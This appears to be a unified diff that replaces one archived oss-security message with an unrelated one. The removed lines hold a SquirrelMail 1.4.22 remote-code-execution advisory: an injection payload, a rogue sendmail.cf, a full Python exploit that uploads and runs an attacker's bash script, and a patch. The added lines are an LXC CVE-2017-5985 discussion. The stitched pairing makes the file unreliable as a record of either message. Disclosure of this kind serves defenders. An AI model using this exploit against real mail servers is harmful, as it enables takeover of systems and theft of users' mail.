@@ -1,449 +1,78 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2017/04/19/7
-Message-ID: <CADSYzssu2X06FJDH3u0sQoAhPRuOBpEonncGMws4nW7RR7KNNw@mail.gmail.com>
-Date: Wed, 19 Apr 2017 11:37:13 -0300
-From: Dawid Golunski <dawid@...alhackers.com>
-To: oss-security@...ts.openwall.com
-Subject: Re: CVE-2017-7692: Squirrelmail 1.4.22 Remote Code Execution
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2017/03/14/4
+Message-ID: <9C8Q126sS901vkG8mMxgQPigkx5gBFpDrXBZJqzB9mfVVKvASCmxDOcSAiq9IjkGPjKbAm7r44vrPcqypgDoadrQ2Wuo4wYXFHdQ8amAvwk=@itk.swiss>
+Date: Tue, 14 Mar 2017 12:17:53 -0400
+From: Stiepan <stie@....swiss>
+To: "oss-security@...ts.openwall.com" <oss-security@...ts.openwall.com>, "857295@...s.debian.org" <857295@...s.debian.org>
+Cc: Stéphane Graber <stgraber@...ntu.com>, serge.hallyn@...ntu.com
+Subject: Re: LXC: CVE-2017-5985: lxc-user-nic didn't verify network namespace ownership
 Content-Type: text/plain; charset=utf-8
 
-Hi Filippo,
+You are welcome. As stated in my reply to Serge H. Hallyn's off-list message, in the meantime I have installed version 2.0.7 from jessie-backports and am unable to reproduce the issue, as I cannot start unprivileged containers anymore (due to a network error). According to Debian's tracker page for lxc, the version that I have installed from backports is 2.0.7-1, which does not include latest upstream fixes. I guess that I have to wait for the 2.0.7-2 package - which includes latest upstream fixes - to land in jessie-backports for these issues (both security and functional) to be fixed.
 
-I actually reported this vulnerability to the vendor at the beginning
-of this year.  I also got the following CVEID assigned for it in
-January: CVE-2017-5181.
-I was waiting on the vendor to patch the vulnerability since then
-before I publish the details.
+CC-ing the Debian address for this bug, as they explicitly asked to do this in case there is a need to reopen the Debian bug, which seems to be the case here (at least, for Jessie, since the intermediary 2.0.7-1 .deb apparently breaks unprivileged networking, besides not fixing the security issue).
+To the Debian team in charge of this bug:
+As unprivileged mode is not activated by default on Debian, I understand that this is not a priority, but it would still be nice to have this fixed quickly.
+By the way, not directly related to this specific bug, but I hope that snapd + LXD somehow finds its way into jessie-backports: that would be great!
 
-Has he got back to you?
-
-On Wed, Apr 19, 2017 at 10:14 AM, Filippo Cavallarin
-<filippo.cavallarin@...resegment.com> wrote:
-> Advisory ID:           SGMA17-001
-> Title:                 Squirrelmail Remote Code Execution
-> Product:               Squirrelmail
-> Version:               1.4.22 and probably prior
-> Vendor:                squirrelmail.org
-> Type:                  Command Injection
-> Risk level:            4 / 5
-> Credit:                filippo.cavallarin@...resegment.com
-> CVE:                   CVE-2017-7692
-> Vendor notification:   2017-04-04
-> Vendor fix:            N/A
-> Public disclosure:     2017-04-19
->
->
->
->
-> DETAILS
->
-> Squirrelmail version 1.4.22 (and probably prior) is vulnerable to a remote code execution vulnerability because
-> it fails to sanitize a string before passing it to a popen call. It's possible to exploit this vulnerability to
-> execute arbitrary shell commands on the remote server.
->
-> The problem is in Deliver_SendMail.class.php on initStream function that uses escapeshellcmd() to sanitize the
-> sendmail command before executing it. The use of escapeshellcmd() is not correct in this case since it don't
-> escapes whitespaces allowing the injection of arbitrary command parameters.
->
->       $this->sendmail_command = "$sendmail_path $this->sendmail_args -f$envelopefrom";
->       $stream = popen(escapeshellcmd($this->sendmail_command), "w");
->
->
-> The $envelopefrom variable is controlled by the attacker, hence it's possible to trick sendmail to use an
-> attacker-provided configuration file that triggers the execution of an arbitrary command.
->
-> In order to exploit this vulnerability the MTA in use must be sendmail and Squirrelmail must be configured
-> to use it as commandline (useSendmail directive of the config file set to true).
-> Also, the edit_identity directive of the config file must be bet to true, but this is the default configuration.
->
-> To reproduce the issue follow these steps:
->         1. Create a rogue sendmail.cf that triggers the execution of a /usr/bin/touch:
->                 [...]
->                 Mlocal,         P=/usr/bin/touch, F=lsDFMAw5:/|@...9S, S=EnvFromL/HdrFromL, R=EnvToL/HdrToL,
->                 T=DNS/RFC822/X-Unix,
->                 A=X /tmp/executed
->         2. Upload it as a mail attachment and get it's remote name (ex: lF51mGPJwdqzV3LEDlCdSVNpohzgF7sD)
->         3. Go to Options -> Personal Informations and set the following payload as Email Address:
->                 <aaa@....com -OQueueDirectory=/tmp  -C /var/local/squirrelmail/attach/lF51mGPJwdqzV3LEDlCdSVNpohzgF7sD>
->         4. Send an email
->         5. Verify the execution of the command with "ls /tmp/executed" on the remote server
->
->
->
->
-> PROOF OF CONCEPT
->
-> The followig python script exploits this vulnerability to execute an attacker provided bash script on the remote server.
->
-> BOF
-> #!/usr/bin/env python
-> # -*- coding: utf-8 -*-
->
-> """
->
-> SquirrelMail 1.4.22 Remote Code Execution (authenticated)
-> Exploit code for CVE-2017-7692
-> filippo.cavallarin@...resegment.com
->
-> """
->
-> from __future__ import unicode_literals
-> import sys
-> import os
-> import re
-> import requests
->
-> reload(sys)
-> sys.setdefaultencoding('utf8')
->
->
-> SENDMAILCF="/tmp/squirrelmail1_4_22-sendmailcf-rce"
-> COMPOSE = "/src/compose.php"
-> INFOS = "/src/options.php?optpage=personal"
-> SQM_ATTACH_PATH = "/var/local/squirrelmail/attach/"
-> # must be enclosed in <> otherwise spaces will be removed ..
-> SENDER = "<px@...x.com -OQueueDirectory=/tmp  -C %s%s>"
->
->
-> SESSID = ""
-> BASEURL = ""
->
->
-> def attach(attachment):
->   url = "%s%s" % (BASEURL, COMPOSE)
->   token = get_csrf_token(url)
->
->   values = {
->     "smtoken": token,
->     "attach": "add"
->   }
->
->   try:
->     files = {'attachfile': open(attachment,'rb')}
->     resp = requests.post(url, files=files, data=values, cookies={'SQMSESSID':SESSID})
->     fname = re.search(r'att_local_name&quot;;s:[0-9]+:&quot;([a-zA-Z0-9]+)&quot;', resp.text)
->     if not fname:
->       print "\nError: unable to upload file %s" % attachment
->     return fname.group(1)
->
->   except Exception as e:
->     print "\nError: %s" % e
->     sys.exit(1)
->
->
-> def send():
->   url = "%s%s" % (BASEURL, COMPOSE)
->   token = get_csrf_token(url)
->
->   values = {
->     "smtoken": token,
->     "send_to": "root",
->     "send": "Send"
->   }
->
->   try:
->     resp = requests.post(url, data=values, cookies={'SQMSESSID':SESSID})
->   except Exception as e:
->     print "\nError: %s" % e
->     sys.exit(1)
->
->
-> def set_identity(sender):
->   url = "%s%s" % (BASEURL, INFOS)
->   token = get_csrf_token(url)
->   values = {
->     "smtoken": token,
->     "optpage": "personal",
->     "optmode": "submit",
->     "new_email_address": sender,
->     "submit_personal": "Submit"
->   }
->
->   try:
->     requests.post(url, data=values, cookies={'SQMSESSID':SESSID})
->   except Exception as e:
->     print "\nError: %s" % e
->     sys.exit(1)
->
->
-> def get_csrf_token(url):
->   try:
->     body = requests.get(url, cookies={'SQMSESSID':SESSID}).text
->     inp = re.search(r'<input.*name="smtoken".*>', body, re.MULTILINE)
->     token = re.search(r'value="([a-zA-Z0-9]+)"', inp.group(0))
->     if token:
->       return token.group(1)
->   except Exception as e:
->     pass
->
->   print "\nUnable to get CSRF token"
->   sys.exit(1)
->
-> def outw(s):
->   sys.stdout.write(s)
->   sys.stdout.flush()
->
-> def main(argv):
->   global BASEURL
->   global SESSID
->
->   if len(argv) != 4:
->     print (
->         "SquirrelMail 1.4.22 Remote Code Execution (authenticated) - filippo.cavallarin@...resegment.com\n"
->         "The target server must use sendmail and squirrelmail must be configured to use /usr/bin/sendmail\n"
->         "Usage:\n"
->         "  %s <url> <session_id> <script>\n"
->         "      url: the url of squirrelmail\n"
->         "      session_id: the value of SQMSESSID cookie\n"
->         "      script: the path to the bash script to be executed on the target\n"
->         "Example:\n"
->         "  %s http:/example.com/squirrelmail/ l2rapvcovsui1on0b4i5boev24 reverseshell.sh"
->       ) % (argv[0], argv[0])
->
->     sys.exit(1)
->
->   BASEURL = argv[1]
->   SESSID = argv[2]
->   script = argv[3]
->
->   outw("Uploading script ... ")
->   script_fname = attach(script)
->   print "ok"
->
->
->   outw("Generating sendmail.cf ... ")
->   try:
->     script_path = "%s%s" % (SQM_ATTACH_PATH, script_fname)
->     with open(SENDMAILCF, 'w') as f:
->       f.write(SENDMAILCF_CONTENT % script_path)
->   except Exception as e:
->     print "\nError: %s" % e
->     sys.exit(1)
->   print "ok"
->
->   outw("Uploading sendmail.cf ... ")
->   smc_fname = attach(SENDMAILCF)
->   os.remove(SENDMAILCF)
->   print "ok"
->
->   outw("Updating user options ... ")
->   sender = SENDER % (SQM_ATTACH_PATH, smc_fname)
->   set_identity(sender)
->   print "ok"
->
->   outw("Checking identity field ... ")
->   icheck = requests.get("%s%s" % (BASEURL, INFOS), cookies={'SQMSESSID':SESSID}).text
->   if not smc_fname in icheck:
->     print "\nError: unable to set identity field .. maybe squirrelmail is configured with edit_identity=false"
->     sys.exit(1)
->   print "ok"
->
->   outw("Executing script ... ")
->   send()
->   print "ok\n"
->   sys.exit(0)
->
-> SENDMAILCF_CONTENT = """
-> O DontBlameSendmail=,AssumeSafeChown,ForwardFileInGroupWritableDirPath,GroupWritableForwardFileSafe,GroupWritableIncludeFileSafe,IncludeFileInGroupWritableDirPath,DontWarnForwardFileInUnsafeDirPath,TrustStickyBit,NonRootSafeAddr,GroupWritableIncludeFile,GroupReadableDefaultAuthInfoFile
-> Kdequote dequote
-> Scanonify=3
-> R$@     $@ <@>
-> R$*     $: $1 <@>     mark addresses
-> R$* < $* > $* <@> $: $1 < $2 > $3     unmark <addr>
-> R@ $* <@>   $: @ $1       unmark @host:...
-> R$* [ IPv6 : $+ ] <@> $: $1 [ IPv6 : $2 ]   unmark IPv6 addr
-> R$* :: $* <@>   $: $1 :: $2     unmark node::addr
-> R:include: $* <@> $: :include: $1     unmark :include:...
-> R$* : $* [ $* ]   $: $1 : $2 [ $3 ] <@>   remark if leading colon
-> R$* : $* <@>    $: $2       strip colon if marked
-> R$* <@>     $: $1       unmark
-> R$* ;        $1       strip trailing semi
-> R$* < $+ :; > $*  $@ $2 :; <@>      catch <list:;>
-> R$* < $* ; >       $1 < $2 >      bogus bracketed semi
-> R$@     $@ :; <@>
-> R$*     $: < $1 >     housekeeping <>
-> R$+ < $* >       < $2 >     strip excess on left
-> R< $* > $+       < $1 >     strip excess on right
-> R<>     $@ < @ >      MAIL FROM:<> case
-> R< $+ >     $: $1       remove housekeeping <>
-> R@ $+ , $+    $2
-> R@ [ $* ] : $+    $2
-> R@ $+ : $+    $2
-> R $+ : $* ; @ $+  $@ $>Canonify2 $1 : $2 ; < @ $3 > list syntax
-> R $+ : $* ;   $@ $1 : $2;     list syntax
-> R$+ @ $+    $: $1 < @ $2 >      focus on domain
-> R$+ < $+ @ $+ >   $1 $2 < @ $3 >      move gaze right
-> R$+ < @ $+ >    $@ $>Canonify2 $1 < @ $2 >  already canonical
-> R$- ! $+    $@ $>Canonify2 $2 < @ $1 .UUCP >  resolve uucp names
-> R$+ . $- ! $+   $@ $>Canonify2 $3 < @ $1 . $2 >   domain uucps
-> R$+ ! $+    $@ $>Canonify2 $2 < @ $1 .UUCP >  uucp subdomains
-> R$* %% $*   $1 @ $2       First make them all @s.
-> R$* @ $* @ $*   $1 %% $2 @ $3     Undo all but the last.
-> R$* @ $*    $@ $>Canonify2 $1 < @ $2 >  Insert < > and finish
-> R$*     $@ $>Canonify2 $1
-> SCanonify2=96
-> R$* < @ localhost > $*    $: $1 < @ $j . > $2   no domain at all
-> R$* < @ localhost . $m > $* $: $1 < @ $j . > $2   local domain
-> R$* < @ localhost . UUCP > $* $: $1 < @ $j . > $2   .UUCP domain
-> R$* < @ [ $+ ] > $*   $: $1 < @@ [ $2 ] > $3    mark [addr]
-> R$* < @@ $=w > $*   $: $1 < @ $j . > $3   self-literal
-> R$* < @@ $+ > $*    $@ $1 < @ $2 > $3   canon IP addr
-> Sfinal=4
-> R$+ :; <@>    $@ $1 :       handle <list:;>
-> R$* <@>     $@        handle <> and list:;
-> R$* < @ $+ . > $* $1 < @ $2 > $3
-> R$* < @ *LOCAL* > $*  $1 < @ $j > $2
-> R$* < $+ > $*   $1 $2 $3      defocus
-> R@ $+ : @ $+ : $+ @ $1 , @ $2 : $3    <route-addr> canonical
-> R@ $*     $@ @ $1       ... and exit
-> R$+ @ $- . UUCP   $2!$1       u@...UCP => h!u
-> R$+ %% $=w @ $=w    $1 @ $2       u%%host@...t => u@...t
-> SRecurse=97
-> R$*     $: $>canonify $1
-> R$*     $@ $>parse $1
-> Sparse=0
-> R$*     $: $>Parse0 $1    initial parsing
-> R<@>      $#local $: <@>    special case error msgs
-> R$*     $: $>ParseLocal $1  handle local hacks
-> R$*     $: $>Parse1 $1    final parsing
-> SParse0
-> R<@>      $@ <@>      special case error msgs
-> R$* : $* ; <@>    $#error $@ 5.1.3 $: "553 List:; syntax illegal for recipient addresses"
-> R@ <@ $* >    < @ $1 >    catch "@@host" bogosity
-> R<@ $+>     $#error $@ 5.1.3 $: "553 User address required"
-> R$+ <@>     $#error $@ 5.1.3 $: "553 Hostname required"
-> R$*     $: <> $1
-> R<> $* < @ [ $* ] : $+ > $* $1 < @ [ $2 ] : $3 > $4
-> R<> $* < @ [ $* ] , $+ > $* $1 < @ [ $2 ] , $3 > $4
-> R<> $* < @ [ $* ] $+ > $* $#error $@ 5.1.2 $: "553 Invalid address"
-> R<> $* < @ [ $+ ] > $*    $1 < @ [ $2 ] > $3
-> R<> $* <$* : $* > $*  $#error $@ 5.1.3 $: "553 Colon illegal in host name part"
-> R<> $*      $1
-> R$* < @ . $* > $* $#error $@ 5.1.2 $: "553 Invalid host name"
-> R$* < @ $* .. $* > $* $#error $@ 5.1.2 $: "553 Invalid host name"
-> R$* < @ $* @ > $* $#error $@ 5.1.2 $: "553 Invalid route address"
-> R$* @ $* < @ $* > $*  $#error $@ 5.1.3 $: "553 Invalid route address"
-> R$* , $~O $*    $#error $@ 5.1.3 $: "553 Invalid route address"
-> R$* < @ > $*    $@ $>Parse0 $>canonify $1 user@ => user
-> R< @ $=w . > : $* $@ $>Parse0 $>canonify $2 @here:... -> ...
-> R$- < @ $=w . >   $: $(dequote $1 $) < @ $2 . > dequote "foo"@here
-> R< @ $+ >   $#error $@ 5.1.3 $: "553 User address required"
-> R$* $=O $* < @ $=w . >  $@ $>Parse0 $>canonify $1 $2 $3 ...@...e -> ...
-> R$-       $: $(dequote $1 $) < @ *LOCAL* >  dequote "foo"
-> R< @ *LOCAL* >    $#error $@ 5.1.3 $: "553 User address required"
-> R$* $=O $* < @ *LOCAL* >
->       $@ $>Parse0 $>canonify $1 $2 $3 ...@...CAL* -> ...
-> R$* < @ *LOCAL* > $: $1
-> SParse1
-> R$* < @ [ $+ ] > $* $: $>ParseLocal $1 < @ [ $2 ] > $3  numeric internet spec
-> R$* < @ [ $+ ] > $* $: $1 < @ [ $2 ] : $S > $3  Add smart host to path
-> R$* < @ [ $+ ] : > $*   $#esmtp $@ [$2] $: $1 < @ [$2] > $3 no smarthost: send
-> R$* < @ [ $+ ] : $- : $*> $*  $#$3 $@ $4 $: $1 < @ [$2] > $5  smarthost with mailer
-> R$* < @ [ $+ ] : $+ > $*  $#esmtp $@ $3 $: $1 < @ [$2] > $4 smarthost without mailer
-> R$=L < @ $=w . >  $#local $: @ $1     special local names
-> R$+ < @ $=w . >   $#local $: $1     regular local name
-> R$* < @ $* > $*   $: $>MailerToTriple < $S > $1 < @ $2 > $3 glue on smarthost name
-> R$* < @$* > $*    $#esmtp $@ $2 $: $1 < @ $2 > $3 user@...t.domain
-> R$=L      $#local $: @ $1   special local names
-> R$+     $#local $: $1     regular local names
-> SLocal_localaddr
-> Slocaladdr=5
-> R$+     $: $1 $| $>"Local_localaddr" $1
-> R$+ $| $#ok   $@ $1     no change
-> R$+ $| $#$*   $#$2
-> R$+ $| $*   $: $1
-> R$+ + *     $#local $@ $&h $: $1
-> R$+ + $*    $#local $@ + $2 $: $1 + *
-> R$+     $: <> $1
-> R< > $+     $: < > < $1 <> $&h >    nope, restore +detail
-> R< > < $+ <> + $* > $: < > < $1 + $2 >    check whether +detail
-> R< > < $+ <> $* > $: < > < $1 >     else discard
-> R< > < $+ + $* > $*    < > < $1 > + $2 $3   find the user part
-> R< > < $+ > + $*  $#local $@ $2 $: @ $1   strip the extra +
-> R< > < $+ >   $@ $1       no +detail
-> R$+     $: $1 <> $&h      add +detail back in
-> R$+ <> + $*   $: $1 + $2      check whether +detail
-> R$+ <> $*   $: $1       else discard
-> R< local : $* > $*  $: $>MailerToTriple < local : $1 > $2 no host extension
-> R< error : $* > $*  $: $>MailerToTriple < error : $1 > $2 no host extension
-> R< $~[ : $+ > $+  $: $>MailerToTriple < $1 : $2 > $3 < @ $2 >
-> R< $+ > $+    $@ $>MailerToTriple < $1 > $2 < @ $1 >
-> SParseLocal=98
-> SEnvFromL
-> R<@>      $n      errors to mailer-daemon
-> R@ <@ $*>   $n      temporarily bypass Sun bogosity
-> R$+     $: $>AddDomain $1 add local domain if needed
-> R$*     $: $>MasqEnv $1   do masquerading
-> SEnvToL
-> R$+ < @ $* >    $: $1     strip host part
-> R$+ + $*    $: < $&{addr_type} > $1 + $2  mark with addr type
-> R<e s> $+ + $*    $: $1     remove +detail for sender
-> R< $* > $+    $: $2     else remove mark
-> SHdrFromL
-> R<@>      $n      errors to mailer-daemon
-> R@ <@ $*>   $n      temporarily bypass Sun bogosity
-> R$+     $: $>AddDomain $1 add local domain if needed
-> R$*     $: $>MasqHdr $1   do masquerading
-> SHdrToL
-> R$+     $: $>AddDomain $1 add local domain if needed
-> R$*     $: $>MasqHdr $1   do all-masquerading
-> SAddDomain
-> R$* < @ $* > $*   $@ $1 < @ $2 > $3 already fully qualified
-> R$+     $@ $1 < @ *LOCAL* > add local qualification
-> Mlocal,   P=/bin/bash, F=lsDFMAw5:/|@...9S, S=EnvFromL/HdrFromL, R=EnvToL/HdrToL,
->     T=DNS/RFC822/X-Unix,
->     A=X %s
-> Mprog,    P=/bin/sh, F=lsDFMoqeu9, S=EnvFromL/HdrFromL, R=EnvToL/HdrToL, D=$z:/,
->     T=X-Unix/X-Unix/X-Unix,
->     A=sh -c $u
->
-> """
->
-> if __name__ == '__main__':
->   main(sys.argv)
->
-> EOF
->
->
->
->
-> SOLUTION
->
-> Since the vendor did not respond to our mails, no official fix is available.
-> However, the following unofficial patch can be used to fix this vulnerability.
->
-> BOF
-> diff -ruN squirrelmail-webmail-1.4.22/class/deliver/Deliver_SendMail.class.php squirrelmail-webmail-1.4.22-fix-CVE-2017-7692/class/deliver/Deliver_SendMail.class.php
-> --- squirrelmail-webmail-1.4.22/class/deliver/Deliver_SendMail.class.php  2011-01-06 02:44:03.000000000 +0000
-> +++ squirrelmail-webmail-1.4.22-fix-CVE-2017-7692/class/deliver/Deliver_SendMail.class.php  2017-04-18 11:42:26.505181944 +0000
-> @@ -93,9 +93,9 @@
->          $envelopefrom = trim($from->mailbox.'@...from->host);
->          $envelopefrom = str_replace(array("\0","\n"),array('',''),$envelopefrom);
->          // save executed command for future reference
-> -        $this->sendmail_command = "$sendmail_path $this->sendmail_args -f$envelopefrom";
-> +        $this->sendmail_command = escapeshellcmd("$sendmail_path $this->sendmail_args -f") . escapeshellarg($envelopefrom);
->          // open process handle for writing
-> -        $stream = popen(escapeshellcmd($this->sendmail_command), "w");
-> +        $stream = popen($this->sendmail_command, "w");
->          return $stream;
->      }
-> EOF
->
->
->
->
-> REFERENCES
->
-> https://squirrelmail.org/
-> https://www.wearesegment.com/research/Squirrelmail-Remote-Code-Execution.html
->
->
->
+Stiepan
 
 
+-------- Original Message --------
+Subject: Re: [oss-security] LXC: CVE-2017-5985: lxc-user-nic didn't verify network namespace ownership
+Local Time: 14 March 2017 2:06 AM
+UTC Time: 14 March 2017 01:07
+From: tyhicks@...onical.com
+To: oss-security@...ts.openwall.com
+Stéphane Graber <stgraber@...ntu.com>, serge.hallyn@...ntu.com
 
--- 
-Regards,
-Dawid Golunski
-https://legalhackers.com
-t: @dawid_golunski
+On 03/10/2017 06:03 AM, Stiepan wrote:
+> I don't know whether that is the same bug, or a related one, but on Debian8 using LXC from jessie-backports, setting the default route in a container affects the host - namely, from an unpriv. container, setting the route sets the host's route as well.
+> lxc-info --version outputs 2.0.6 and no update is currently available (on Debian).
+
+Thanks for the report. I just tried to reproduce the issue on Ubuntu
+16.04 with 2.0.7-0ubuntu1~16.04.2, which is the package patched for the
+issue that I announced in this thread. I couldn't reproduce it.
+
+I then installed an old 2.0.6 based deb (2.0.6-0ubuntu1~ubuntu16.04.1)
+and still couldn't reproduce it.
+
+I'd suggest opening an upstream bug here:
+
+https://github.com/lxc/lxc/issues/new
+
+(Normally, they prefer private security bugs on Launchpad but your
+report to this list is already public so I don't see a need.)
+
+Tyler
+
+> Stiepan
+>
+>
+>
+> -------- Original Message --------
+> Subject: [oss-security] LXC: CVE-2017-5985: lxc-user-nic didn't verify network namespace ownership
+> Local Time: 9 March 2017 5:54 PM
+> UTC Time: 9 March 2017 16:55
+> From: tyhicks@...onical.com
+> To: oss-security@...ts.openwall.com
+> Stéphane Graber <stgraber@...ntu.com>
+>
+> Jann Horn discovered that the lxc-user-nic program could be tricked into
+> operating on a network namespace over which the caller did not hold
+> privilege.
+>
+> The behavior didn't follow what was documented in the lxc-user-nic(1)
+> man page:
+>
+> It ensures that the calling user is privileged over the network
+> namespace to which the interface will be attached.
+>
+> This issue is CVE-2017-5985.
+>
+> https://lists.linuxcontainers.org/pipermail/lxc-users/2017-March/012925.html
+> https://launchpad.net/bugs/1654676
+> https://github.com/lxc/lxc/commit/16af238036a5464ae8f2420ed3af214f0de875f9
+>
+> Tyler
+>
